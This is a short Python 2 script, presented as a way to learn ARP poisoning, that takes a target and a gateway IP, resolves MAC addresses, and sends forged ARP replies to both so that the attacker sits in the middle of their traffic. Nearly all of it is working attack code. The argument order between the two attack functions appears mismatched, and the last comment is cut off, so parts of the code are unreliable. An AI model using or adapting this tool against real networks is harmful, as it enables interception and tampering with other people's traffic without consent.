#-------------------------------------------------------------------------------
# Name:        Arp_Spoof
# Purpose:     Learn how Arp Poisoning/Spoofing works
#
# Author:      Vasanth Sadhasivan
#
# Created:     01/02/2015
#-------------------------------------------------------------------------------
import arp, time, subprocess, sys, socket # uses advantage of Python's arp
import thread
SPOOFED_IP=''
TARGET_IP=''
macaddr_spoofed=''
macaddr_target=''
macaddr_my=''


def welcome():
    welcome_message = ["*","*","*","*","*","W","e","l","c","o","m","e"," ","t","o"," ","m","y"," ","A","R","P"," ","s","p","o","o","f","i","n","g"," ","t","o","o","l","*","*","*","*","*"]
    for i in range(len(welcome_message)):
        time.sleep(.01)
        print welcome_message[i],
    print "\n"

def userinput():
    global SPOOFED_IP
    global TARGET_IP
    global macaddr_spoofed
    global macaddr_target
    global macaddr_my
    TARGET_IP = raw_input("[+] Give the ipaddress of target host: ")
    sys.stdout.flush()
    SPOOFED_IP = raw_input("[+] Please give me the spoofed ip address wanted: ")


def attackphaseone():
    global SPOOFED_IP
    global TARGET_IP
    global macaddr_spoofed
    global macaddr_target
    global macaddr_my
    targetmacobj = arp.arp_resolve(str(TARGET_IP), 0) # target mac object
    spoofedmacobj = arp.arp_resolve(str(SPOOFED_IP), 0) # spoofed mac object
    mymacaddrobj = arp.arp_resolve(str(socket.gethostbyname(socket.gethostname())), 0) # mac address object of my computer
    macaddr_spoofed = arp.mac_straddr(spoofedmacobj, 1, "") # mac address of spoofed computer
    macaddr_target = arp.mac_straddr(targetmacobj, 1, "") # mac address of target computer
    macaddr_my = arp.mac_straddr(mymacaddrobj, 1, "") # mac address of my computer

def attackphasetwo(destip, srcip, destmac, srcmac): # function that spoofs the mac addresses using arp replies
    global SPOOFED_IP
    global TARGET_IP
    global macaddr_spoofed
    global macaddr_target
    global macaddr_my
    for i in range(3):
        arp.rarp_reply(destip, destmac, srcip, srcmac)
        print "sent"
        time.sleep(1)

if __name__ == "__main__":

    global macaddr_my
    welcome()
    userinput()
    attackphaseone()
    thread.start_new_thread(attackphasetwo, (TARGET_IP, macaddr_target, SPOOFED_IP, macaddr_my, )) # spoof target victim computer into thinking you are default gateway
    attackphasetwo(str(SPOOFED_IP), str(macaddr_spoofed), str(TARGET_IP), str(macaddr_my)) # spoof default gateway into thinking you are
